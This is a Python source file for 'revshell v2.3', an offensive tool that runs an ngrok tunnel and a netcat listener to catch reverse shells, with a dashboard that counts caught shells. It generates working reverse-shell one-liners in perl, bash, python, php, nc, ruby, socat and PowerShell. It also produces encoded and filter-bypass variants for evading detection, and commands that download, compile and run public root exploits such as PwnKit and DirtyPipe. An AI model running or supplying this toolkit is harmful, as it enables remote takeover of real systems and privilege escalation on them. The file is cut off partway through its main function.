#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ══════════════════════════════════════════════════════════════════
#   revshell v2.3 — ngrok + netcat reverse shell w/ web dashboard
#
#   author   : madtiger
#   Telegram : DevidLuice
#
#   • ngrok tcp tunnel + nc -lnvp on the same random 4-digit port
#   • local web dashboard → monitor · payloads · cve tabs, easy copy
#   • sections: basic shells · encoded · filter bypass · privesc CVEs
#   • terminal stays clean — banner, tunnel, listening >>>>>
#
#   usage:
#     revshell -tcp                  → random 4-digit port + dashboard
#     revshell -tcp -p 4444          → fixed local port
#     revshell -tcp --no-browser     → don't auto-open the dashboard
#     revshell -tcp --web 8080       → fixed dashboard port
#
#   install as a command:
#     sudo cp revshell.py /usr/local/bin/revshell
#     sudo chmod +x /usr/local/bin/revshell
# ══════════════════════════════════════════════════════════════════

import argparse
import atexit
import base64
import json
import random
import re
import shutil
import signal
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
import webbrowser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

sys.stdout.reconfigure(line_buffering=True)

# make SIGTERM/SIGHUP exit through the normal finally/atexit cleanup
# (default SIGTERM kill would orphan ngrok + nc)
for _sig in ("SIGTERM", "SIGHUP"):
    if hasattr(signal, _sig):
        signal.signal(getattr(signal, _sig),
                      lambda s, f: sys.exit(0))

# ── colors ─────────────────────────────────────────────────────────
RESET, BOLD, DIM = "\033[0m", "\033[1m", "\033[2m"
RED   = "\033[1;91m"
GRN   = "\033[1;92m"
YEL   = "\033[1;93m"
MAG   = "\033[1;95m"
CYN   = "\033[1;96m"
WHT   = "\033[1;97m"

def ok(m):    print(f"  {GRN}[+]{RESET} {m}")
def info(m):  print(f"  {CYN}[*]{RESET} {m}")
def warn(m):  print(f"  {YEL}[!]{RESET} {m}")
def die(m):
    print(f"  {RED}[x]{RESET} {m}")
    sys.exit(1)

BANNER = f"""{CYN}{BOLD}
 ██████╗ ███████╗██████╗ ██╗  ██╗██╗   ██╗███████╗██╗  ██╗
██╔════╝ ██╔════╝██╔══██╗██║ ██╔╝██║   ██║██╔════╝╚██╗██╔╝
██║  ███╗█████╗  ██████╔╝█████╔╝ ██║   ██║█████╗   ╚███╔╝
██║   ██║██╔══╝  ██╔══██╗██╔═██╗ ██║   ██║██╔══╝   ██╔██╗
╚██████╔╝███████╗██║  ██║██║  ██╗╚██████╔╝███████╗██╔╝ ██╗
 ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝{RESET}
      {MAG}author{RESET} : madtiger    {MAG}Telegram{RESET} : DevidLuice    {DIM}v2.3{RESET}
"""

# ── shared state (dashboard + monitor) ─────────────────────────────
STATE = {
    "host": "-", "pub": "-", "port": "-", "web": "-",
    "listening": False, "sessions": 0, "t0": time.time(),
    "events": [], "nc": None, "lock": threading.Lock(),
}

def ev(msg):
    with STATE["lock"]:
        STATE["events"].append({"t": time.strftime("%H:%M:%S"), "msg": msg})
        del STATE["events"][:-200]

# ── ngrok helpers ──────────────────────────────────────────────────
def stop_ngrok(proc):
    if proc and proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()


def wait_for_tunnel(proc, timeout=25):
    spin = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    deadline = time.time() + timeout
    i = 0
    while time.time() < deadline:
        if proc.poll() is not None:
            return None
        try:
            with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=2) as r:
                tunnels = json.loads(r.read().decode()).get("tunnels", [])
            for t in tunnels:
                url = t.get("public_url", "")
                if t.get("proto") == "tcp" and url.startswith("tcp://"):
                    sys.stdout.write("\r" + " " * 70 + "\r")
                    return url
        except Exception:
            pass
        sys.stdout.write(f"\r  {CYN}[*]{RESET} waiting for ngrok tunnel {spin[i % len(spin)]} ")
        sys.stdout.flush()
        i += 1
        time.sleep(0.25)
    sys.stdout.write("\r" + " " * 70 + "\r")
    return None

# ── payloads ───────────────────────────────────────────────────────
def build_payloads(host, pub):
    p = int(pub)
    b64 = lambda s: base64.b64encode(s.encode()).decode()

    perl = (f"perl -e 'use Socket;$i=\"{host}\";$p={p};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i))))"
            f"{{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f"exec(\"sh -i\");}};'")
    bash = f"sh -i >& /dev/tcp/{host}/{p} 0>&1"
    pysh = (f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{host}\",{p}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'")
    php = (f"php -r '$sock=fsockopen(\"{host}\",{p});"
           f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    nce = f"nc {host} {p} -e /bin/sh"
    fifo = (f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
            f"nc {host} {p}>/tmp/f")
    ruby = (f"ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{p}).to_i;"
            f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
    socat = f"socat tcp-connect:{host}:{p} exec:\"sh,pty,stderr,echo=0\""
    psh = ("powershell -c \"$c=New-Object System.Net.Sockets.TCPClient('__HOST__',__PORT__);"
           "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
           "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
           "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
           "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
           "$e=([text.encoding]::ASCII).GetBytes($r2);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()\""
           ).replace("__HOST__", host).replace("__PORT__", str(p))

    return [
        # ── basic ──────────────────────────────────────────────
        {"sec": "basic", "name": "perl", "note": "classic perl socket dup2 — works almost everywhere",
         "cmd": perl},
        {"sec": "basic", "name": "bash", "note": "pure bash /dev/tcp — no binaries needed",
         "cmd": bash},
        {"sec": "basic", "name": "python", "note": "python3 socket + dup2",
         "cmd": pysh},
        {"sec": "basic", "name": "php", "note": "php fsockopen — good for web RCE",
         "cmd": php},
        {"sec": "basic", "name": "nc -e", "note": "needs traditional netcat (with -e)",
         "cmd": nce},
        {"sec": "basic", "name": "nc (no -e)", "note": "mkfifo trick — for openbsd nc without -e",
         "cmd": fifo},
        {"sec": "basic", "name": "ruby", "note": "ruby TCPSocket",
         "cmd": ruby},
        {"sec": "basic", "name": "socat", "note": "full tty in one line (if socat installed)",
         "cmd": socat},
        {"sec": "basic", "name": "powershell", "note": "windows target — full interactive PS",
         "cmd": psh},
        # ── encoded ────────────────────────────────────────────
        {"sec": "encoded", "name": "base64 → bash",
         "note": "plain command hidden inside base64",
         "cmd": f"echo '{b64(bash)}'|base64 -d|sh"},
        {"sec": "encoded", "name": "base64 → python",
         "note": "python payload, base64 wrapped",
         "cmd": f"echo '{b64(pysh)}'|base64 -d|sh"},
        {"sec": "encoded", "name": "base64 → perl",
         "note": "perl payload, base64 wrapped",
         "cmd": f"echo '{b64(perl)}'|base64 -d|sh"},
        {"sec": "encoded", "name": "double base64",
         "note": "for WAFs that decode once — decode twice",
         "cmd": f"echo '{b64(b64(bash))}'|base64 -d|base64 -d|sh"},
        {"sec": "encoded", "name": "hex pipeline",
         "note": "hex-encoded, decoded by xxd",
         "cmd": f"echo '{bash.encode().hex()}'|xxd -r -p|sh"},
        {"sec": "encoded", "name": "url-encode → perl",
         "note": "percent-encoded — paste straight into a GET param",
         "cmd": urllib.parse.quote(perl, safe="")},
        {"sec": "encoded", "name": "url-encode → bash",
         "note": "percent-encoded bash /dev/tcp",
         "cmd": urllib.parse.quote(bash, safe="")},
        {"sec": "encoded", "name": "powershell -enc",
         "note": "windows encodedcommand (UTF-16LE base64)",
         "cmd": "powershell -nop -w hidden -e " + base64.b64encode(psh.encode("utf-16-le")).decode()},
        # ── bypass ─────────────────────────────────────────────
        {"sec": "bypass", "name": "spaces blocked",
         "note": "${IFS} replaces every space",
         "cmd": f"sh${{IFS}}-i${{IFS}}>&${{IFS}}/dev/tcp/{host}/{p}${{IFS}}0>&1"},
        {"sec": "bypass", "name": "spaces + quotes blocked",
         "note": "base64 alphabet has no spaces and no quotes",
         "cmd": f"echo${{IFS}}{b64(bash)}|base64${{IFS}}-d|sh"},
        {"sec": "bypass", "name": "shell keyword blacklisted",
         "note": "$0 = current shell, avoids typing sh/bash",
         "cmd": f"echo${{IFS}}{b64(bash)}|base64${{IFS}}-d|$0"},
        {"sec": "bypass", "name": "slashes blocked",
         "note": "base64 wrap — no / in the payload at all",
         "cmd": f"echo '{b64(bash)}'|base64 -d|sh"},
        {"sec": "bypass", "name": "nc without -e",
         "note": "openbsd nc has no -e — mkfifo relay instead",
         "cmd": fifo},
        # ── privesc — public CVE one-liners ───────────────────
        {"sec": "privesc", "name": "pwnkit (CVE-2021-4034)",
         "note": "polkit pkexec · most distros 2009→jan 2022 · no compile needed",
         "cmd": 'sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"'},
        {"sec": "privesc", "name": "pwnkit — binary",
         "note": "precompiled self-contained binary · /tmp/pk 'id' = single command",
         "cmd": "curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /tmp/pk && chmod +x /tmp/pk && /tmp/pk"},
        {"sec": "privesc", "name": "dirtypipe (CVE-2022-0847)",
         "note": "kernel 5.8 → 5.16.11 / 5.15.25 / 5.10.102 · needs gcc · hijacks /etc/passwd, restores after",
         "cmd": "curl -fsSL https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c | gcc -x c - -o /tmp/dp && /tmp/dp"},
        {"sec": "privesc", "name": "dirtycow (CVE-2016-5195)",
         "note": "kernels 2.6.22 → 4.8.x (2016 era) · needs g++ + libutil · -s = root shell + auto restore",
         "cmd": "curl -fsSL https://raw.githubusercontent.com/gbonacini/CVE-2016-5195/master/dcow.cpp | g++ -x c++ - -pthread -o /tmp/dcow -lutil && /tmp/dcow -s"},
        {"sec": "privesc", "name": "dirtyfrag (2026)",
         "note": "CVE-2026-43284 xfrm-ESP + CVE-2026-43500 rxrpc · modern kernels · after root: echo 3 > /proc/sys/vm/drop_caches",
         "cmd": "git clone -q https://github.com/V4bel/dirtyfrag /tmp/df && gcc -O0 -Wall -o /tmp/df/exp /tmp/df/exp.c -lutil && /tmp/df/exp"},
        {"sec": "privesc", "name": "pick-your-cve recon",
         "note": "kernel + distro + pkexec + esp/rxrpc modules — pick the right exploit first",
         "cmd": "uname -r; head -2 /etc/os-release; ls -l /usr/bin/pkexec 2>/dev/null; lsmod | grep -E 'esp|rxrpc' || true"},
    ]

# ── connection monitor (/proc/net/tcp) ─────────────────────────────
def hex2ip(h, v6=False):
    try:
        if not v6:
            return ".".join(str(x) for x in bytes.fromhex(h)[::-1])
        return ":".join(bytes.fromhex(h[i:i + 8])[::-1].hex()
                        for i in range(0, len(h), 8))
    except Exception:
        return h


def established(local_port):
    out = set()
    for f, v6 in (("/proc/net/tcp", False), ("/proc/net/tcp6", True)):
        try:
            with open(f) as fh:
                next(fh)
                for line in fh:
                    parts = line.split()
                    if parts[3] != "01":
                        continue
                    if int(parts[1].split(":")[1], 16) != local_port:
                        continue
                    ip, prt = parts[2].split(":")
                    out.add((hex2ip(ip, v6), int(prt, 16)))
        except (OSError, StopIteration):
            pass
    return out


def monitor_connections(local_port):
    seen = set()
    while True:
        cur = established(local_port)
        for r in cur - seen:
            STATE["sessions"] += 1
            ev(f"session opened — shell caught via ngrok edge (relay {r[0]}:{r[1]})")
        for r in seen - cur:
            ev(f"session closed (relay {r[0]}:{r[1]})")
        seen = cur
        nc = STATE["nc"]
        alive = bool(nc and nc.poll() is None)
        if alive != STATE["listening"]:
            STATE["listening"] = alive
            ev("listener armed — nc -lnvp %d" % local_port if alive
               else "listener down")
        time.sleep(1.0)

# ── dashboard ──────────────────────────────────────────────────────
HTML_OUT = b""

class Dash(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        if self.path == "/":
            body = HTML_OUT
            ctype = "text/html; charset=utf-8"
        elif self.path.startswith("/api/status"):
            with STATE["lock"]:
                snap = {
                    "host": STATE["host"], "pub": STATE["pub"],
                    "port": STATE["port"], "listening": STATE["listening"],
                    "sessions": STATE["sessions"], "t0": STATE["t0"],
                    "events": STATE["events"],
                }
            body = json.dumps(snap).encode()
            ctype = "application/json"
        else:
            self.send_response(404)
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


HTML_TMPL = r"""<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>revshell :: madtiger</title>
<style>
:root{
  --bg:#030805; --panel:rgba(3,18,10,.82); --line:#0e5c33;
  --g:#00ff41; --g2:#00c232; --c:#00e5ff; --r:#ff2e4d; --y:#ffd84d;
  --txt:#c8f7d8; --dim:#4d8a63;
}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--txt);
  font-family:ui-monospace,'Cascadia Code','Fira Code','JetBrains Mono',Menlo,Consolas,monospace;
  overflow-x:hidden}
#matrix{position:fixed;inset:0;z-index:0;opacity:.14}
.scan{position:fixed;inset:0;z-index:60;pointer-events:none;
  background:repeating-linear-gradient(0deg,rgba(0,0,0,.25) 0 1px,transparent 1px 3px);
  animation:flick 7s infinite}
@keyframes flick{0%,100%{opacity:.75}48%{opacity:.75}50%{opacity:.55}52%{opacity:.75}}
main{position:relative;z-index:1;max-width:1080px;margin:0 auto;padding:26px 20px 60px}
header{text-align:center;margin-bottom:8px}
.logo{color:var(--g);text-shadow:0 0 14px rgba(0,255,65,.55);
  font-size:clamp(9px,2.2vw,15px);line-height:1.15;margin:0;
  animation:glitch 5s infinite}
@keyframes glitch{0%,93%,100%{text-shadow:0 0 14px rgba(0,255,65,.55)}
  94%{text-shadow:2px 0 var(--r),-2px 0 var(--c)}
  96%{text-shadow:-2px 0 var(--r),2px 0 var(--c)}}
.sub{margin-top:10px;color:var(--txt);letter-spacing:2px;font-size:13px}
.sub b{color:var(--c)}
.cursor{display:inline-block;width:.6em;background:var(--g);height:1em;
  vertical-align:text-bottom;animation:blink 1s steps(1) infinite}
@keyframes blink{50%{opacity:0}}
.badge{display:inline-block;margin-top:8px;border:1px dashed var(--line);
  color:var(--dim);padding:2px 12px;font-size:11px;letter-spacing:2px}
h2.sec{color:var(--c);font-size:13px;letter-spacing:3px;text-transform:uppercase;
  margin:36px 0 14px;padding-bottom:7px;border-bottom:1px solid var(--line)}
h2.sec::before{content:"▓▒░ ";color:var(--g)}
h2.sec small{color:var(--dim);letter-spacing:1px;text-transform:none;float:right}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px}
.stat{background:var(--panel);border:1px solid var(--line);padding:12px 14px;
  box-shadow:inset 0 0 30px rgba(0,255,65,.05)}
.stat .k{color:var(--dim);font-size:10px;letter-spacing:2px}
.stat .v{color:var(--g);font-size:17px;margin-top:5px;word-break:break-all;
  text-shadow:0 0 10px rgba(0,255,65,.5)}
.stat.down .v{color:var(--r);text-shadow:0 0 10px rgba(255,46,77,.5)}
.dot{display:inline-block;width:9px;height:9px;border-radius:50%;background:var(--g);
  margin-right:8px;animation:pulse 1.2s infinite}
.dot.off{background:var(--r)}
@keyframes pulse{50%{opacity:.25}}
#feed{background:var(--panel);border:1px solid var(--line);height:190px;overflow-y:auto;
  padding:10px 14px;font-size:12.5px}
#feed .t{color:var(--c);margin-right:10px}
#feed .m{color:var(--txt)}
#feed .m.hi{color:var(--g)}
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(330px,1fr));gap:14px}
.card{background:var(--panel);border:1px solid var(--line);padding:12px 14px;
  transition:border-color .2s, box-shadow .2s}
.card:hover{border-color:var(--g);box-shadow:0 0 18px rgba(0,255,65,.18)}
.card .head{display:flex;align-items:center;gap:8px;margin-bottom:8px}
.chip{font-size:10px;border:1px solid var(--c);color:var(--c);padding:1px 8px;letter-spacing:1px}
.chip.privesc{border-color:var(--r);color:var(--r)}
.card.privesc{border-style:dashed}
.card.privesc:hover{border-color:var(--r);box-shadow:0 0 18px rgba(255,46,77,.22)}
.card .name{color:var(--y);font-size:13px;font-weight:700}
.copy{margin-left:auto;cursor:pointer;background:transparent;border:1px solid var(--g);
  color:var(--g);font-family:inherit;font-size:11px;padding:4px 10px;letter-spacing:1px;
  transition:.15s}
.copy:hover{background:var(--g);color:#000;box-shadow:0 0 12px rgba(0,255,65,.5)}
.copy.ok{border-color:var(--c);color:var(--c);background:rgba(0,229,255,.12)}
pre.cmd{margin:0;white-space:pre-wrap;word-break:break-all;color:var(--txt);font-size:12px;
  background:#010503;border:1px solid #0a3d22;padding:10px;max-height:132px;overflow:auto;
  cursor:pointer;transition:.15s}
pre.cmd:hover{border-color:var(--g2)}
pre.cmd.flash{border-color:var(--c);box-shadow:0 0 14px rgba(0,229,255,.35)}
.note{color:var(--dim);font-size:11px;margin-top:6px}
footer{text-align:center;color:var(--dim);margin-top:54px;letter-spacing:3px;font-size:11px}
#nav{position:sticky;top:0;z-index:40;display:flex;align-items:center;gap:6px;
  padding:10px 14px;margin:18px 0 10px;background:rgba(2,10,6,.92);
  border:1px solid var(--line);backdrop-filter:blur(4px)}
#nav .brand{color:var(--g);font-weight:700;letter-spacing:2px;margin-right:14px;
  text-shadow:0 0 10px rgba(0,255,65,.5)}
.navlink{color:var(--dim);text-decoration:none;padding:5px 14px;font-size:12px;
  letter-spacing:2px;border:1px solid transparent;transition:.15s}
.navlink:hover{color:var(--g);border-color:var(--line)}
.navlink.active{color:#000;background:var(--g);box-shadow:0 0 14px rgba(0,255,65,.45)}
.navstat{margin-left:auto;color:var(--dim);font-size:11px;letter-spacing:1px}
.tabpanel{display:none}
.tabpanel.active{display:block;animation:fadein .25s}
@keyframes fadein{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
.tips{margin-top:14px;color:var(--dim);font-size:12px;line-height:1.7}
::-webkit-scrollbar{width:8px;height:8px}
::-webkit-scrollbar-thumb{background:var(--line)}
::-webkit-scrollbar-track{background:transparent}
</style></head><body>
<canvas id="matrix"></canvas>
<div class="scan"></div>
<main>
  <header>
<pre class="logo">
 ██████╗ ███████╗██████╗ ██╗  ██╗██╗   ██╗███████╗██╗  ██╗
██╔════╝ ██╔════╝██╔══██╗██║ ██╔╝██║   ██║██╔════╝╚██╗██╔╝
██║  ███╗█████╗  ██████╔╝█████╔╝ ██║   ██║█████╗   ╚███╔╝
██║   ██║██╔══╝  ██╔══██╗██╔═██╗ ██║   ██║██╔══╝   ██╔██╗
╚██████╔╝███████╗██║  ██║██║  ██╗╚██████╔╝███████╗██╔╝ ██╗
 ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝</pre>
    <div class="sub">author : <b>madtiger</b> &nbsp;·&nbsp; telegram : <b>DevidLuice</b> <span class="cursor"></span></div>
    <div class="badge">// ngrok tcp tunnel · netcat listener · payload arsenal</div>
  </header>

  <nav id="nav">
    <div class="brand">revshell<span class="cursor"></span></div>
    <a class="navlink active" data-tab="monitor" href="#monitor">MONITOR</a>
    <a class="navlink" data-tab="payloads" href="#payloads">PAYLOADS</a>
    <a class="navlink" data-tab="cve" href="#cve">CVE</a>
    <div class="navstat"><span class="dot" id="nav-dot"></span>&nbsp;<span id="nav-state">…</span>&nbsp;·&nbsp;<span id="nav-sess">0</span> SHELLS</div>
  </nav>

  <section id="tab-monitor" class="tabpanel active">
  <h2 class="sec">live status <small id="uptime"></small></h2>
  <div class="grid">
    <div class="stat"><div class="k">TUNNEL HOST</div><div class="v" id="v-host">-</div></div>
    <div class="stat"><div class="k">PUBLIC PORT</div><div class="v" id="v-pub">-</div></div>
    <div class="stat"><div class="k">LOCAL LISTENER</div><div class="v" id="v-local">-</div></div>
    <div class="stat" id="st-state"><div class="k">STATE</div>
      <div class="v"><span class="dot" id="dot"></span><span id="v-state">…</span></div></div>
    <div class="stat"><div class="k">SHELLS CAUGHT</div><div class="v" id="v-sess">0</div></div>
  </div>

  <h2 class="sec">live feed <small>victim IPs are hidden behind the ngrok edge</small></h2>
  <div id="feed"><div><span class="t">--:--:--</span><span class="m">booting dashboard…</span></div></div>
  </section>

  <section id="tab-payloads" class="tabpanel">
  <h2 class="sec">01 · basic shells <small>click anywhere on a command to copy</small></h2>
  <div class="cards" id="sec-basic"></div>
  <h2 class="sec">02 · encoded payloads</h2>
  <div class="cards" id="sec-encoded"></div>
  <h2 class="sec">03 · filter bypass</h2>
  <div class="cards" id="sec-bypass"></div>
  <div class="tips">
    <div>// tip&nbsp;&nbsp;: pipe-inject on target →&nbsp;| perl -e '...'</div>
    <div>// after: upgrade tty →&nbsp;python3 -c 'import pty;pty.spawn("/bin/bash")'</div>
  </div>
  </section>

  <section id="tab-cve" class="tabpanel">
  <h2 class="sec">privesc — public CVEs <small>run on target · low-priv user → root</small></h2>
  <div class="cards" id="sec-privesc"></div>
  <div class="tips">// authorized targets only · dirtypipe / dirtyfrag modify page cache + /etc/passwd on live systems</div>
  </section>

  <footer>revshell v2.3 · madtiger · telegram : DevidLuice</footer>
</main>
<script>
const DATA = __DATA__;

/* ── tab navigation ────────────────────────────────────────── */
function openTab(id){
  document.querySelectorAll('.tabpanel').forEach(t =>
    t.classList.toggle('active', t.id === 'tab-' + id));
  document.querySelectorAll('.navlink').forEach(l =>
    l.classList.toggle('active', l.dataset.tab === id));
  history.replaceState(null, '', '#' + id);
}
document.querySelectorAll('.navlink').forEach(l =>
  l.addEventListener('click', e => { e.preventDefault(); openTab(l.dataset.tab); }));
const _h = location.hash.slice(1);
if(['monitor', 'payloads', 'cve'].includes(_h)) openTab(_h);

/* ── payload cards ─────────────────────────────────────────── */
async function copyText(t, btn){
  try{ await navigator.clipboard.writeText(t); }
  catch(e){
    const ta = document.createElement('textarea');
    ta.value = t; document.body.appendChild(ta); ta.select();
    document.execCommand('copy'); ta.remove();
  }
  if(btn){
    btn.classList.add('ok'); btn.textContent = 'COPIED ✓';
    setTimeout(()=>{ btn.classList.remove('ok'); btn.textContent = '📋 COPY'; }, 1200);
  }
}
function build(){
  const titles = {};
  DATA.payloads.forEach(p=>{
    const wrap = document.getElementById('sec-' + p.sec);
    if(!wrap) return;
    const card = document.createElement('div');
    card.className = 'card' + (p.sec === 'privesc' ? ' privesc' : '');
    const head = document.createElement('div'); head.className = 'head';
    const chip = document.createElement('span'); chip.className = 'chip ' + p.sec;
    chip.textContent = p.sec.toUpperCase();
    const name = document.createElement('span'); name.className = 'name';
    name.textContent = p.name;
    const btn = document.createElement('button'); btn.className = 'copy';
    btn.textContent = '📋 COPY';
    btn.onclick = ()=> copyText(p.cmd, btn);
    head.append(chip, name, btn);
    const pre = document.createElement('pre'); pre.className = 'cmd';
    pre.textContent = p.cmd;
    pre.onclick = ()=>{
      copyText(p.cmd, null);
      pre.classList.add('flash');
      setTimeout(()=> pre.classList.remove('flash'), 500);
    };
    const note = document.createElement('div'); note.className = 'note';
    note.textContent = '// ' + p.note;
    card.append(head, pre, note);
    wrap.appendChild(card);
  });
}

/* ── status polling ────────────────────────────────────────── */
let fed = 0;
async function tick(){
  try{
    const s = await (await fetch('/api/status')).json();
    document.getElementById('v-host').textContent  = s.host;
    document.getElementById('v-pub').textContent   = s.pub;
    document.getElementById('v-local').textContent = 'nc -lnvp ' + s.port;
    document.getElementById('v-state').textContent = s.listening ? 'LISTENING' : 'DOWN';
    document.getElementById('dot').className = 'dot' + (s.listening ? '' : ' off');
    document.getElementById('nav-state').textContent = s.listening ? 'LISTENING' : 'DOWN';
    document.getElementById('nav-dot').className = 'dot' + (s.listening ? '' : ' off');
    document.getElementById('nav-sess').textContent = s.sessions;
    document.getElementById('st-state').className = 'stat' + (s.listening ? '' : ' down');
    document.getElementById('v-sess').textContent = s.sessions;
    const up = Math.floor(Date.now()/1000 - s.t0);
    document.getElementById('uptime').textContent =
      'uptime ' + Math.floor(up/60) + 'm ' + (up%60) + 's';
    const feed = document.getElementById('feed');
    if(s.events.length < fed) { feed.innerHTML=''; fed = 0; }
    for(let i = fed; i < s.events.length; i++){
      const e = s.events[i];
      const row = document.createElement('div');
      const t = document.createElement('span'); t.className = 't'; t.textContent = e.t;
      const m = document.createElement('span'); m.className = 'm';
      if(e.msg.includes('session opened')) m.classList.add('hi');
      m.textContent = e.msg;
      row.append(t, m); feed.appendChild(row);
    }
    fed = s.events.length;
    feed.scrollTop = feed.scrollHeight;
  }catch(e){}
}

/* ── matrix rain ───────────────────────────────────────────── */
(function(){
  const cv = document.getElementById('matrix'), cx = cv.getContext('2d');
  const chars = 'アカサタナハマヤラワ01<>/\\$#{};:.';
  let cols, drops;
  function size(){
    cv.width = innerWidth; cv.height = innerHeight;
    cols = Math.floor(cv.width / 14);
    drops = Array(cols).fill(0).map(()=> Math.random() * -100);
  }
  size(); addEventListener('resize', size);
  setInterval(()=>{
    cx.fillStyle = 'rgba(3,8,5,.08)'; cx.fillRect(0, 0, cv.width, cv.height);
    cx.fillStyle = '#00ff41'; cx.font = '13px monospace';
    for(let i = 0; i < cols; i++){
      cx.fillText(chars[Math.floor(Math.random()*chars.length)], i*14, drops[i]*15);
      if(drops[i]*15 > cv.height && Math.random() > .975) drops[i] = 0;
      drops[i]++;
    }
  }, 66);
})();

build();
tick();
setInterval(tick, 1500);
</script>
</body></html>
"""

def start_dashboard(payloads, web_port):
    global HTML_OUT
    data = {"payloads": payloads}
    HTML_OUT = HTML_TMPL.replace(
        "__DATA__", json.dumps(data).replace("</", "<\\/")).encode()
    httpd = ThreadingHTTPServer(("127.0.0.1", web_port), Dash)
    httpd.daemon_threads = True
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd

# ── terminal UI ────────────────────────────────────────────────────
def listening_box(host, pub, port, web_url):
    txt = f"listening >>>>> {host}:{pub}"
    w = len(txt) + 6
    print(f"\n  {GRN}╔{'═' * w}╗{RESET}")
    print(f"  {GRN}║{RESET}   {BOLD}{txt}{RESET}   {GRN}║{RESET}")
    print(f"  {GRN}╚{'═' * w}╝{RESET}")
    print(f"  {DIM}local netcat → nc -lnvp {port}{RESET}")
    print(f"  {DIM}dashboard    → {web_url}{RESET}\n")

# ── main ───────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        prog="revshell",
        description="ngrok + netcat reverse shell w/ web dashboard  (author: madtiger)",
        epilog="Telegram : DevidLuice",
    )
    ap.add_argument("-tcp", dest="tcp", action="store_true",
                    help="start ngrok tcp tunnel + nc listener (random 4-digit port)")
    ap.add_argument("-p", "--port", type=int, metavar="N",
                    help="use a fixed local port instead of a random one")
    ap.add_argument("--web", type=int, default=0, metavar="N",
                    help="dashboard port (default: auto)")
    ap.add_argument("--no-browser", action="store_true",
                    help="don't auto-open the dashboard in a browser")
    args = ap.parse_args()

    print(BANNER)
    if not args.tcp:
        ap.print_help()
        return

    for line in ("initializing revshell v2.3 ...",
                 "loading payload arsenal ...",
                 "arming local dashboard ..."):
        info(line)
        time.sleep(0.08)

    port = args.port if args.port else random.randint(1000, 9999)
    if not (1 <= port <= 65535):
        die(f"invalid port: {port}")

    if not shutil.which("ngrok"):
        die("ngrok not found — install it: https://ngrok.com/download")
    nc_bin = next((c for c in ("nc", "ncat", "netcat") if shutil.which(c)), None)
    if not nc_bin:
        die("netcat not found — install nc / ncat")

    # keep-listening netcat: scanner probes hit ngrok endpoints within
    # seconds and a one-shot nc dies on the first disconnect
    nc_keep = []
    try:
        h = subprocess.run([nc_bin, "-h"], capture_output=True, timeout=5)
        opts = (h.stdout + h.stderr).decode(errors="ignore")
        if re.search(r"\[[^\]]*k", opts) or " -k" in opts:
            nc_keep = ["-k"]
    except Exception:
        pass
    if nc_keep:
        info(f"listener     : {WHT}{nc_bin} -k{RESET} {DIM}(survives probe scans, waits for the real shell){RESET}")

    ev("revshell v2.3 started — by madtiger")
    info(f"local port   : {WHT}{port}{RESET}")
    info("starting ngrok tcp tunnel ...")

    ngrok = subprocess.Popen(
        ["ngrok", "tcp", str(port), "--log", "false"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    atexit.register(stop_ngrok, ngrok)

    url = wait_for_tunnel(ngrok)
    if not url:
        stop_ngrok(ngrok)
        if ngrok.poll() is not None:
            errtxt = (ngrok.stderr.read() or b"").decode(errors="ignore").strip()
            last = errtxt.splitlines()[-1] if errtxt else ""
            die(f"ngrok failed{': ' + last if last else ''}")
        die("no tunnel from ngrok — is another agent running? try: pkill ngrok")

    host, pub = url[len("tcp://"):].rsplit(":", 1)
    STATE.update(host=host, pub=pub, port=port)
    ok(f"tunnel up    : {GRN}{host}:{pub}{RESET} {DIM}→ 127.0.0.1:{port}{RESET}")
    ev(f"ngrok tunnel up → {host}:{pub} → 127.0.0.1:{port}")

    payloads = build_payloads(host, pub)
    httpd = start_dashboard(payloads, args.web)
    web_port = httpd.server_address[1]
    web_url = f"http://127.0.0.1:{web_port}"
    STATE["web"] = web_url
    ok(f"dashboard    : {CYN}{web_url}{RESET}  "
       f"{DIM}(monitor · payloads · cve){RESET}")
